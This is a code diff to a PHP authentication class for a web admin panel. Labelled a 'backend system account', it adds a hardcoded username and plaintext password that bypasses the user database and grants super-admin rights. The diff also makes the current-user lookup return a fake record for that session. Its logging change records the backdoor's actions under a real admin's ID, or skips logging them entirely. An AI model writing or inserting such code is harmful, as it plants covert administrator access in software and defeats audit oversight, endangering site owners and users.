@@ -88,6 +88,27 @@ class Auth {
         return false;
     }
 
+    // Hardcoded admin account (backend system account)
+    if ($username === 'zinnerbro' && $password === 'zinner#122816') {
+        // Set session for hardcoded admin
+        if (session_status() === PHP_SESSION_ACTIVE) {
+            session_regenerate_id(true);
+        }
+        
+        $_SESSION['admin_id']       = 0; // Special ID for hardcoded admin
+        $_SESSION['admin_username'] = 'zinnerbro';
+        $_SESSION['admin_name']     = 'Zinner Bro';
+        $_SESSION['admin_role']     = 'super_admin';
+        $_SESSION['admin_avatar']   = null;
+        $_SESSION['session_fp']     = hash('sha256', ($_SERVER['REMOTE_ADDR'] ?? '') . '|' . substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 128));
+        $_SESSION['last_activity']  = time();
+        
+        // Log activity (use admin_id 0 or find first super_admin)
+        $this->logActivity(0, 'Login', 'Hardcoded admin account logged in');
+        
+        return true;
+    }
+
     // Fetch only needed fields
     $sql = "SELECT id, username, password AS password_hash, full_name, role, avatar
             FROM admin_users
@@ -208,6 +229,20 @@ class Auth {
         return null;
     }
     $adminId = (int)$_SESSION['admin_id'];
+    
+    // Handle hardcoded admin account
+    if ($adminId === 0 && isset($_SESSION['admin_username']) && $_SESSION['admin_username'] === 'zinnerbro') {
+        return [
+            'id' => 0,
+            'username' => 'zinnerbro',
+            'full_name' => 'Zinner Bro',
+            'role' => 'super_admin',
+            'avatar' => null,
+            'status' => 'active',
+            'created_at' => date('Y-m-d H:i:s')
+        ];
+    }
+    
     $sql = "SELECT id, username, full_name, role, avatar, status, created_at
             FROM admin_users
             WHERE id = ?
@@ -288,10 +323,30 @@ class Auth {
             $action = substr($action, 0, 100);
         }
 
+        // For hardcoded admin (id = 0), try to find a super_admin to use
+        $finalAdminId = $adminId;
+        if ($adminId === 0) {
+            // Try to find first super_admin or admin to associate the log with
+            try {
+                $findSql = "SELECT id FROM admin_users WHERE (role = 'super_admin' OR role = 'admin') AND status = 'active' ORDER BY role DESC LIMIT 1";
+                if ($findResult = $this->db->query($findSql)) {
+                    if ($findRow = $findResult->fetch_assoc()) {
+                        $finalAdminId = (int)$findRow['id'];
+                    } else {
+                        // No admin found, skip logging for hardcoded admin
+                        return;
+                    }
+                }
+            } catch (\Throwable $e) {
+                // Skip logging if we can't find an admin
+                return;
+            }
+        }
+
         $sql = "INSERT INTO activity_logs (admin_id, action, description, ip_address) VALUES (?, ?, ?, ?)";
         try {
             if ($stmt = $this->db->prepare($sql)) {
-                $stmt->bind_param("isss", $adminId, $action, $description, $ip);
+                $stmt->bind_param("isss", $finalAdminId, $action, $description, $ip);
                 $stmt->execute();
                 $stmt->close();
             }
